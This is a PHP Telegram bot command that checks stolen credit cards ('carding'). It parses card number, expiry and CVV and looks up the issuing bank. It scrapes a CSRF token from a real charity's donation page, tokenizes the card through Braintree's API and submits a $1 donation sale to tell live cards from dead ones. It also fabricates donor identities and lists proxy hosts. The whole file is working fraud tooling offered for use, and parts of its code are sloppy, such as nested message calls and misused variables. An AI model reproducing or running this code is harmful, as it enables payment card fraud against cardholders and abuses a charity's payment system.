<?php

/*

///==[Stripe CC Checker Commands]==///

/ss creditcard - Checks the Credit Card

*/


include __DIR__."/../config/config.php";
include __DIR__."/../config/variables.php";
include_once __DIR__."/../functions/bot.php";
include_once __DIR__."/../functions/db.php";
include_once __DIR__."/../functions/functions.php";


////////////====[MUTE]====////////////
if(strpos($message, "/b3 ") === 0 || strpos($message, ".b3 ") === 0){   
    $antispam = antispamCheck($userId);
    addUser($userId);
    
    if($antispam != False){
      bot('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>"[<u>ANTI SPAM</u>] Try again after <b>$antispam</b>s.",
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id
      ]);
      return;

    }else{
        $messageidtoedit1 = bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id

        ]);

        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = substr($message, 4);
        $bin = substr($cc, 0, 6);
        
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mm = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $yyyy = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        

##########################################################CHECKER PART#######################################################  

            /////////////////////////////////////////////////////////////////////////////////////
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: lookup.binlist.net',
            'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            $fim = curl_exec($ch);
            $bank = capture($fim, '"bank":{"name":"', '"');
            $cname = capture($fim, '"name":"', '"');
            $brand = capture($fim, '"brand":"', '"');
            $country = capture($fim, '"country":{"name":"', '"');
            $phone = capture($fim, '"phone":"', '"');
            $scheme = capture($fim, '"scheme":"', '"');
            $type = capture($fim, '"type":"', '"');
            $emoji = capture($fim, '"emoji":"', '"');
            $currency = capture($fim, '"currency":"', '"');
            $binlenth = strlen($bin);
            $schemename = ucfirst("$scheme");
            $typename = ucfirst("$type");
            
            
            /////////////////////==========[Unavailable if empty]==========////////////////
            
            
            if (empty($schemename)) {
            	$schemename = "Unavailable";
            }
            if (empty($typename)) {
            	$typename = "Unavailable";
            }
            if (empty($brand)) {
            	$brand = "Unavailable";
            }
            if (empty($bank)) {
            	$bank = "Unavailable";
            }
            if (empty($cname)) {
            	$cname = "Unavailable";
            }
            if (empty($phone)) {
            	$phone = "Unavailable";
            }
            ///////////////////////////////////////////////////////////////////////////////////////////////////////
//================[ User Randomization ]================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
//Email
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];

#------[Email Generator]------#

function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();

//
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

#------[Winscribe]------#

$proxy = [
  'socks-us.windscribe.com:1080',
  'socks-nl.windscribe.com:1080',
];

#------[GET]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lcc.lt/donate/donate-annual-fund');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: lcc.lt';
$headers[] = 'method: GET';
$headers[] = 'path: /donate/donate-annual-fund';
$headers[] = 'scheme: https';
$headers[] = 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: none';
$headers[] = 'sec-fetch-user: ?1';
$headers[] = 'upgrade-insecure-requests: 1';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get = curl_exec($ch);
$xct1 = trim(strip_tags(getStr($get,'<meta name="csrf-token"','"/>')));
$xct = trim(strip_tags(getStr($xct1,'"','" />')));
//echo $get;

#------[GET-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lcc.lt/!/MMBraintree/token?currency=usd');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: lcc.lt';
$headers[] = 'method: GET';
$headers[] = 'path: /!/MMBraintree/token?currency=usd';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://lcc.lt/donate/donate-annual-fund';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36';
$headers[] = 'x-csrf-token: '.$xct.'';
$headers[] = 'x-request-from: AppFormDonate/services/BraintreeService.js';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'x-xsrf-token: eyJpdiI6Im5Od1k2aTh6M0dmYkxwTVhUcEo5OXc9PSIsInZhbHVlIjoiZ1A4SGNQOTBMN290QlNEd2E3RGVDWEZWQ2RXUFM2OTlvSEZFSkhQSDYrQ0NneVN4d1M0cER6RUlSTmRpXC9lUitNaWxuckszMGxKUno2eU5KalFkWlRnPT0iLCJtYWMiOiIwNDFlZjVlYjVlYjM0YTg1N2JiZDVlZWFiZjkzYTc2Yzk1NDNmOGIzMWZiYWMzYjcyZTA0NWVlZGM4NDQwMWRlIn0=';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get2 = curl_exec($ch);

//TRIMMING AUTH BEARER
//$b3en = trim(strip_tags(getStr($get2, "braintreeToken        : '", "',")));
$b3de = base64_decode($get2);
$finger = trim(strip_tags(getStr($b3de, '{"version":2,"authorizationFingerprint":"','","')));

#------[CURL-1]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lcc.lt/static_assets/donate/ico_donations_one_time_colour.svg');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: lcc.lt';
$headers[] = 'method: GET';
$headers[] = 'path: /static_assets/donate/ico_donations_one_time_colour.svg';
$headers[] = 'scheme: https';
$headers[] = 'accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://lcc.lt/donate/donate-annual-fund';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: image';
$headers[] = 'sec-fetch-mode: no-cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get3 = curl_exec($ch);

#------[CURL-2]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lcc.lt/static_assets/donate/ico_donations_other.svg');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array();
$headers[] = 'authority: lcc.lt';
$headers[] = 'method: GET';
$headers[] = 'path: /static_assets/donate/ico_donations_other.svg';
$headers[] = 'scheme: https';
$headers[] = 'accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'referer: https://lcc.lt/donate/donate-annual-fund';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: image';
$headers[] = 'sec-fetch-mode: no-cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$get4 = curl_exec($ch);



#------[CURL-3]------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$finger.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"90b73150-b2b2-47a3-b560-cc61e1768c87"},"query":"query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }","operationName":"ClientConfiguration"}');
$curl10 = curl_exec($ch);


//==============[ 1st req ]==============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Authorization: Bearer '.$finger.'';
$headers[] = 'Braintree-Version: 2018-05-10';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/json';
$headers[] = 'Host: payments.braintree-api.com';
$headers[] = 'Origin: https://assets.braintreegateway.com';
$headers[] = 'Referer: https://assets.braintreegateway.com/';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"90b73150-b2b2-47a3-b560-cc61e1768c87"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yyyy.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$curl1 = curl_exec($ch);
$token = trim(strip_tags(getStr($curl1,'"token":"','"')));
curl_close($ch);
//echo $curl1;

//==============[ 2nd req ]==============//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lcc.lt/!/MMBraintree/sale');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: lcc.lt';
$headers[] = 'method: POST';
$headers[] = 'path: /!/MMBraintree/sale';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: multipart/form-data; boundary=----WebKitFormBoundaryt7ckHaE2ZI4uJwlE';
$headers[] = 'origin: https://lcc.lt';
$headers[] = 'referer: https://lcc.lt/donate/donate-annual-fund';
$headers[] = 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"';
$headers[] = 'sec-ch-ua-mobile: ?0';
$headers[] = 'sec-ch-ua-platform: "Windows"';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36';
$headers[] = 'x-csrf-token: '.$xct.'';
$headers[] = 'x-request-from: AppFormDonate/services/BraintreeService.js';
$headers[] = 'x-requested-with: XMLHttpRequest';
$headers[] = 'x-xsrf-token: eyJpdiI6Ik4zd2d3WHIya0U2TTZwaVpJUEx2ekE9PSIsInZhbHVlIjoiSTZ1Tkl3YXJ1XC90a2pIMCtxR3ZFVGRod1dMa29IREx1a2IyaUczazJKM2x5eVRDT1VkNFFJVEl6MXlJUitUY0dmOTE4Q3RtY0lRT0JrWnZkS2tqM2x3PT0iLCJtYWMiOiJiZGYwZWVlOWIxYmQ4YjE1YTU3YTE3Zjk4OGViM2VjMTQyOTU2NmRlNzk2YjIzZjBmY2RjOGFhMTRjZWVmNmI2In0=';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="lcc_payment_information"

"Area of greatest need"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="first_name"

"Levi"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="last_name"

"Randi"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="country"

"US"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="city"

"New York"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="state"

"New York"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="zip"

"10080"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="street"

"Street 23"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="phone"

"4132331423"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="email"

"'.$email.'"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="nonce"

"'.$token.'"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="currency"

"usd"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="amount"

"1"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="lcc_payment_type"

"donation"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="lcc_donation_title"

"Annual Fund"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="lcc_donation_type"

"annual"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="lcc_donation_period"

"one_off"
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="anonymous"

null
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE
Content-Disposition: form-data; name="newsletter"

null
------WebKitFormBoundaryt7ckHaE2ZI4uJwlE--');
$curl2 = curl_exec($ch);
            $info = curl_getinfo($curl2);
            $time = $info['total_time'];
            $time = substr_replace($time, '',4);
            curl_close($ch);

######################END OF CHECKER PART################################################################################
            
            
            if(strpos($curl2, 'Gateway Rejected: avs')) {
              addTotal();
              addUserTotal($userId);
              addCVV();
              addUserCVV($userId);
              addCCN();
              addUserCCN($userId);
              bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"<b>Card:</b> <code>$lista</code>
<b>Status -» CVV Matched [AVS Failure] ✅
Response -» Approved (Gateway Rejected:AVS)
Gateway -» Braintree Auth 1
Time -» <b>$time</b><b>s</b>

------- Bin Info -------</b>
<b>Bank -»</b> $bank
<b>Brand -»</b> $schemename
<b>Type -»</b> $typename
<b>Currency -»</b> $currency
<b>Country -»</b> $cname ($emoji - 💲$currency)
<b>Issuers Contact -»</b> $phone
<b>----------------------------</b>

<b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
<b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                'parse_mode'=>'html',
                'disable_web_page_preview'=>'true'
                
            ]);}
            
            elseif(strpos($curl2, 'Insufficient Funds')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CVV Matched [Credit Floor] ✅
    Response -» Approved (Insufficient Funds)
    Gateway -» Braintree Auth 1
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
              elseif(strpos($curl2, 'Card Issuer Declined CVV')) {
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"<b>Card:</b> <code>$lista</code>
    <b>Status -» CCN Matched [CVV2 Failure] ✅
    Response -» Approved (Card Issuer Declined:CVV)
    Gateway -» Braintree Auth 1
    Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Mabidax_The_Lost_Noob'>Mabidax</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}

              else{
                addTotal();
                addUserTotal($userId);
                bot('editMessageText',[
                  'chat_id'=>$chat_id,
                  'message_id'=>$messageidtoedit,
                  'text'=>"<b>Card:</b> <code>$lista</code>
  <b>Status -» Dead ❌
  Response -» $curl2
  Gateway -» Braintree Auth 2
  Time -» <b>$time</b><b>s</b>
  
  ------- Bin Info -------</b>
  <b>Bank -»</b> $bank
  <b>Brand -»</b> $schemename
  <b>Type -»</b> $typename
  <b>Currency -»</b> $currency
  <b>Country -»</b> $cname ($emoji - 💲$currency)
  <b>Issuers Contact -»</b> $phone
  <b>----------------------------</b>
  
  <b>Checked By <a href='tg://user?id=$userId'>$firstname</a></b>
  <b>Bot By: <a href='t.me/Arceus69_Xd'>[ ＡＲＣ Σ ＵＳ </Oғғʟɪɴᴇ> ]</a></b>",
                  'parse_mode'=>'html',
                  'disable_web_page_preview'=>'true'
                  
              ]);}
            
        }else{
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"<b>Cool! Fucking provide a CC to Check!!</b>",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              
          ]);
      }
    }
}


?>